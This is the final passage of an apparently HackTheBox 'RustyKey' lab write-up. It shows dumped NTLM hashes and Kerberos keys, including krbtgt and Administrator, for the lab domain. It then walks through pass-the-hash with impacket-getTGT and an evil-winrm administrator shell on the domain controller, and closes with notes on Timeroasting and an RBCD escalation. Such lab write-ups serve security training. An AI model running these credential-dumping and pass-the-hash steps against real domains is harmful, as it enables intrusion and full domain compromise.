IT-Computer1$:1123:aad3b435b51404eeaad3b435b51404ee:fe60afe8d9826130f0e06cd2958a8a61:::
IT-Computer2$:1124:aad3b435b51404eeaad3b435b51404ee:73d844e19c8df244c812d4be1ebcff80:::
IT-Computer3$:1125:aad3b435b51404eeaad3b435b51404ee:b52b582f02f8c0cd6320cd5eab36d9c6:::
IT-Computer4$:1126:aad3b435b51404eeaad3b435b51404ee:763f9ea340ccd5571c1ffabf88cac686:::
IT-Computer5$:1127:aad3b435b51404eeaad3b435b51404ee:1679431d1c52638688b4f1321da14045:::
[*] Kerberos keys grabbed
Administrator:des-cbc-md5:e007705d897310cd
krbtgt:aes256-cts-hmac-sha1-96:ee3271eb3f7047d423c8eeaf1bd84f4593f1f03ac999a3d7f3490921953d542a
krbtgt:aes128-cts-hmac-sha1-96:24465a36c2086d6d85df701553a428af
krbtgt:des-cbc-md5:d6d062fd1fd32a64
rustykey.htb\rr.parker:des-cbc-md5:8c5b3b54b9688aa1
rustykey.htb\mm.turner:aes256-cts-hmac-sha1-96:707ba49ed61c6575bfe9a3fd1541fc008e8803bfb0d7b5d21122cc464f39cbb9
rustykey.htb\mm.turner:aes128-cts-hmac-sha1-96:a252d2716a0b365649eaec02f84f12c8
rustykey.htb\mm.turner:des-cbc-md5:a46ea77c13854945
rustykey.htb\bb.morgan:des-cbc-md5:d6ef5e57a2abb93b
rustykey.htb\gg.anderson:des-cbc-md5:8923850da84f2c0d
rustykey.htb\dd.ali:des-cbc-md5:613da45e3bef34a7
rustykey.htb\ee.reed:des-cbc-md5:2fc46d9b898a4a29
rustykey.htb\nn.marcos:aes256-cts-hmac-sha1-96:53ee5251000622bf04e80b5a85a429107f8284d9fe1ff5560a20ec8626310ee8
rustykey.htb\nn.marcos:aes128-cts-hmac-sha1-96:cf00314169cb7fea67cfe8e0f7925a43
rustykey.htb\nn.marcos:des-cbc-md5:e358835b1c238661
rustykey.htb\backupadmin:des-cbc-md5:625e25fe70a77358
DC$:des-cbc-md5:915d9d52a762675d
Support-Computer1$:aes256-cts-hmac-sha1-96:89a52d7918588ddbdae5c4f053bbc180a41ed703a30c15c5d85d123457eba5fc
Support-Computer1$:aes128-cts-hmac-sha1-96:3a6188fdb03682184ff0d792a81dd203
Support-Computer1$:des-cbc-md5:c7cb8a76c76dfed9
Support-Computer2$:aes256-cts-hmac-sha1-96:50f8a3378f1d75df813db9d37099361a92e2f2fb8fcc0fc231fdd2856a005828
Support-Computer2$:aes128-cts-hmac-sha1-96:5c3fa5c32427fc819b10f9b9ea4be616
Support-Computer2$:des-cbc-md5:a2a202ec91e50b6d
Support-Computer3$:aes256-cts-hmac-sha1-96:e3b7b8876ac617dc7d2ba6cd2bea8de74db7acab2897525dfd284c43c8427954
Support-Computer3$:aes128-cts-hmac-sha1-96:1ea036e381f3279293489c19cfdeb6c1
Support-Computer3$:des-cbc-md5:c13edcfe4676f86d
Support-Computer4$:aes256-cts-hmac-sha1-96:1708c6a424ed59dedc60e980c8f2ab88f6e2bb1bfe92ec6971c8cf5a40e22c1e
Support-Computer4$:aes128-cts-hmac-sha1-96:9b6d33ef93c69721631b487dc00d3047
Support-Computer4$:des-cbc-md5:3b79647680e0d57a
Support-Computer5$:aes256-cts-hmac-sha1-96:464551486df4086accee00d3d37b60de581ee7adad2a6a31e3730fad3dfaed42
Support-Computer5$:aes128-cts-hmac-sha1-96:1ec0c93b7f9df69ff470e2e05ff4ba89
Support-Computer5$:des-cbc-md5:73abb53162d51fb3
Finance-Computer1$:aes256-cts-hmac-sha1-96:a57ce3a3e4ee34bc08c8538789fa6f99f5e8fb200a5f77741c5bf61b3d899918
Finance-Computer1$:aes128-cts-hmac-sha1-96:e62b7b772aba6668af65e9d1422e6aea
Finance-Computer1$:des-cbc-md5:d9914cf29e76f8df
Finance-Computer2$:aes256-cts-hmac-sha1-96:4d45b576dbd0eab6f4cc9dc75ff72bffe7fae7a2f9dc50b5418e71e8dc710703
Finance-Computer2$:aes128-cts-hmac-sha1-96:3fd0dd200120ca90b43af4ab4e344a78
Finance-Computer2$:des-cbc-md5:23ef512fb3a8d37c
Finance-Computer3$:aes256-cts-hmac-sha1-96:1b2280d711765eb64bdb5ab1f6b7a3134bc334a3661b3335f78dd590dee18b0d
Finance-Computer3$:aes128-cts-hmac-sha1-96:a25859c88f388ae7134b54ead8df7466
Finance-Computer3$:des-cbc-md5:2a688a43ab40ecba
Finance-Computer4$:aes256-cts-hmac-sha1-96:291adb0905f3e242748edd1c0ecaab34ca54675594b29356b90da62cf417496f
Finance-Computer4$:aes128-cts-hmac-sha1-96:81fed1f0eeada2f995ce05bbf7f8f951
Finance-Computer4$:des-cbc-md5:6b7532c83bc84c49
Finance-Computer5$:aes256-cts-hmac-sha1-96:6171c0240ae0ce313ecbd8ba946860c67903b12b77953e0ee38005744507e3de
Finance-Computer5$:aes128-cts-hmac-sha1-96:8e6aa26b24cdda2d7b5474b9a3dc94dc
Finance-Computer5$:des-cbc-md5:92a72f7f865bb6cd
IT-Computer1$:aes256-cts-hmac-sha1-96:61028ace6c840a6394517382823d6485583723f9c1f98097727ad3549d833b1e
IT-Computer1$:aes128-cts-hmac-sha1-96:7d1a98937cb221fee8fcf22f1a16b676
IT-Computer1$:des-cbc-md5:019d29370ece8002
IT-Computer2$:aes256-cts-hmac-sha1-96:e9472fb1cf77df86327e5775223cf3d152e97eebd569669a6b22280316cf86fa
IT-Computer2$:aes128-cts-hmac-sha1-96:a80fba15d78f66477f0591410a4ffda7
IT-Computer2$:des-cbc-md5:622f2ae961abe932
IT-Computer3$:aes256-cts-hmac-sha1-96:7871b89896813d9e4a732a35706fe44f26650c3da47e8db4f18b21cfbb7fbecb
IT-Computer3$:aes128-cts-hmac-sha1-96:0e14a9e6fd52ab14e36703c1a4c542e3
IT-Computer3$:des-cbc-md5:f7025180cd23e5f1
IT-Computer4$:aes256-cts-hmac-sha1-96:68f2e30ca6b60ec1ab75fab763087b8772485ee19a59996a27af41a498c57bbc
IT-Computer4$:aes128-cts-hmac-sha1-96:181ffb2653f2dc5974f2de924f0ac24a
IT-Computer4$:des-cbc-md5:bf58cb437340cd3d
IT-Computer5$:aes256-cts-hmac-sha1-96:417a87cdc95cb77997de6cdf07d8c9340626c7f1fbd6efabed86607e4cfd21b8
IT-Computer5$:aes128-cts-hmac-sha1-96:873fd89f24e79dcd0affe6f63c51ec9a
IT-Computer5$:des-cbc-md5:ad5eec6bcd4f86f7
[*] Cleaning up... 
```

Then we also need to get the `TGT` ticket first and get the administrator shell
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ impacket-getTGT rustykey.htb/'Administrator' -hashes ":f7a351e12f70cc177a1d5bd11b28ac26"
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ export KRB5CCNAME=Administrator.ccache                                
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ evil-winrm -i dc.rustykey.htb -u 'administrator' -r rustykey.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

`Walkup` password: `f7a351e12f70cc177a1d5bd11b28ac26`
# Description

It is very suitable as a hard machine.

I think the main thing that surprised me in the foothold was `Timeroasting to hash leak`, because I didn't see any useful information in the initial default user enumeration.
There are also restrictions on protected objects. When I first tried it, I suspected that it was my network problem, but it was actually because it was restricted by security.

For the subsequent privilege escalation, AddAllowedToAct is an exploit point that I rarely encounter. Setting IT-COMPUTER$3 to pretend to be a DC and then conducting RBCD attacks is indeed very unique and interesting.